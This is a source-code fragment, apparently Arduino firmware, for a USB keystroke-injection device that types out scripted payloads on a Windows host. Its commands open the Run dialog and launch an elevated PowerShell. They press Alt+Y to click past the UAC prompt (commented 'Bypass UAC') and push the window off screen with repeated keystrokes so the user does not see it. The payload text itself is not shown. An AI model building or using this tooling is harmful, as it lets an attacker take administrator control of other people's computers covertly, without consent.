void setupKeyboardAndMouseComponent() {
  if (!emulate)
    while(true);
  // Mouse.begin();
  Keyboard.begin();
}

void type(char* inputLine) {
  bool skip = false;

  if (charsAre(inputLine, "{ENTER}")) {
    Keyboard.println();
    skip = true;
  }

  if (charsAre(inputLine, "{RUN}")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    skip = true;
  }

  if (strcmp(inputLine, "{D100}") == 0) {
    delay(100 * delayRatio);
    skip = true;
  }

  if (strcmp(inputLine, "{D500}") == 0) {
    delay(500 * delayRatio);
    skip = true;
  }
  
  if (strcmp(inputLine, "{D1K}") == 0) {
    delay(1000 * delayRatio);
    skip = true;
  }

  if (strcmp(inputLine, "{D5K}") == 0) {
    delay(5000 * delayRatio);
    skip = true;
  }

  if (strcmp(inputLine, "{D10K}") == 0) {
    delay(10000 * delayRatio);
    skip = true;
  }

  if (strcmp(inputLine, "{POWERSHELL}") == 0) {
    // Open RUN
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    // Open Powershell as admin
    delay(200);
    Keyboard.println("powershell Start-Process powershell -Verb runAs");

    // Bypass UAC
    delay(2000);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('y');
    delay(100);
    Keyboard.releaseAll();
    delay(200);
    skip = true;
  }

  if (strcmp(inputLine, "{HIDE}") == 0) {
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    delay(80);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.write('m');
    delay(200);
    
    for (int i=0; i<150; i++) {
      Keyboard.write(KEY_DOWN_ARROW);
      delay(10);
    }
      

    Keyboard.println();

    /* Mouse.move(0, 200);
    delay(20);
    Mouse.click(MOUSE_LEFT);
    delay(20);
    Mouse.move(0, -10); */
    
    skip = true;
  }

  if (!skip) {
    for (int i = 0; i<MAX_PAYLOAD_LEN; i++) {
      if (inputLine[i] == '\0') {
        break;
      }
      Keyboard.write(inputLine[i]);
    }
  }
}
